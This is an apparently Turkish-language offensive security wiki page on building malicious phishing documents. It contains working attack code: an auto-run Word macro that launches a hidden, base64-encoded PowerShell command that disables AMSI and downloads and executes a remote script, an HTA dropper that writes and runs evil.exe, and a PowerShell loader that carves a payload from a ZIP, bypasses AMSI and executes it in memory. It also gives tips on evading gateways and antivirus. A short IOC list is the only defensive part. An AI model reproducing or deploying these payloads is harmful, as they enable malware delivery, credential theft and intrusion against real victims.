# Phishing Dosyalar & Belgeler

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya verisi doğrulaması yapar. Veri doğrulaması, OfficeOpenXML standardına göre veri yapısı tanımlaması şeklinde gerçekleştirilir. Veri yapısı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmaz.

Genellikle makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirip dosyanın adını yeniden vererek makro çalıştırma yeteneği korunabilir.\
Örneğin, RTF formatı tasarım gereği makroları desteklemez, ancak DOCM olarak adlandırılmış bir dosya RTF'ye yeniden adlandırıldığında Microsoft Word tarafından işlenir ve makro çalıştırabilir hale gelir.\
Aynı iç yapı ve mekanizmalar Microsoft Office Suite'in (Excel, PowerPoint etc.) tüm yazılımları için de geçerlidir.

Bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için aşağıdaki komutu kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\  
_**Kategoriler**: Links and References, **Alan adları**: includePicture, ve **Dosya adı veya URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden arbitrary code çalıştırmak için macros kullanmak mümkündür.

#### Otomatik yükleme fonksiyonları

Ne kadar yaygınlarsa, AV tarafından tespit edilme olasılıkları o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Kod Örnekleri
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verilerini elle kaldır

Şuraya gidin: **File > Info > Inspect Document > Inspect Document**, bu Document Inspector'ı açacaktır. **Inspect**'e tıklayın ve ardından **Document Properties and Personal Information** yanında bulunan **Remove All**'a tıklayın.

#### Doc Uzantısı

İşiniz bittikten sonra **Save as type** açılır menüsünü seçin, formatı **`.docx`**'ten **Word 97-2003 `.doc`**'a değiştirin.\
Bunun nedeni, **`.docx`** içine makroları kaydedememeniz ve makro etkin **`.docm`** uzantısının etrafında bir **stigma** olmasıdır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta gateway'leri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşıdır**.

#### Kötü Amaçlı Makro Üreticileri

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

Bir HTA, **HTML ve script dillerini (örneğin VBScript ve JScript)** birleştiren bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modelinin kısıtlamaları olmadan "tam güvenilir" bir uygulama olarak çalışır.

Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **yüklü** gelir, bu da **`mshta`**'nın IE'ye bağımlı olmasına neden olur. Bu nedenle, Internet Explorer kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication'ı Zorlama

Several ways to **force NTLM authentication "remotely"**, örneğin kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbanın sadece **klasörü açmasıyla** bir **authentication** tetikleyecek **dosyaların adresini** gönderebilirsiniz.

**Aşağıdaki sayfalarda bu fikirleri ve daha fazlasını inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Unutmayın, sadece hash'i veya authentication'ı çalamazsınız, aynı zamanda **perform NTLM relay attacks** da yapabilirsiniz:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Oldukça etkili kampanyalar iki meşru tuzak belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Hile şudur: gerçek PowerShell loader, ZIP’in ham byte'larının içinde benzersiz bir işaretleyiciden sonra saklanır ve .lnk onu bellekte çıkarır ve tamamen çalıştırır.

.lnk PowerShell one-liner tarafından uygulanan tipik akış:

1) Orijinal ZIP'i yaygın yollar içinde bul: Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üst klasörü.
2) ZIP byte'larını oku ve sert kodlanmış bir marker (ör. xFIQCV) bul. Marker'dan sonraki her şey gömülü PowerShell payload'tır.
3) ZIP'i %ProgramData% içine kopyala, orada çıkar ve meşru görünmesi için tuzak .docx'i aç.
4) Geçerli süreç için AMSI'yi atla: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamayı deobfuscate et (ör. tüm # karakterlerini kaldır) ve bellekte çalıştır.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notlar
- Teslimat genellikle saygın PaaS alt alan adlarını kötüye kullanır (örn., *.herokuapp.com) ve yükleri kısıtlayabilir (IP/UA'ya göre zararsız ZIP'ler sunabilir).
- Bir sonraki aşama genellikle base64/XOR shellcode'unu çözer ve disk artefaktlarını azaltmak için Reflection.Emit + VirtualAlloc ile çalıştırır.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control — böylece IE/Explorer veya onu içeren herhangi bir uygulama payload'u otomatik olarak yeniden başlatır. Ayrıntılar ve hazır komutlar için buraya bakın:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII işaretçi dizisini (örn., xFIQCV) içeren ZIP dosyaları.
- ZIP'i bulmak için üst/kullanıcı klasörlerini tarayan ve bir decoy document açan .lnk.
- AMSI'ye müdahale, [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla.
- Güvenilen PaaS alan adlarında barındırılan linklerle sonuçlanan uzun süre çalışan iş parçacıkları.

## NTLM hash'lerini çalmak için Windows dosyaları

İlgili sayfaya bakın: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referanslar

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
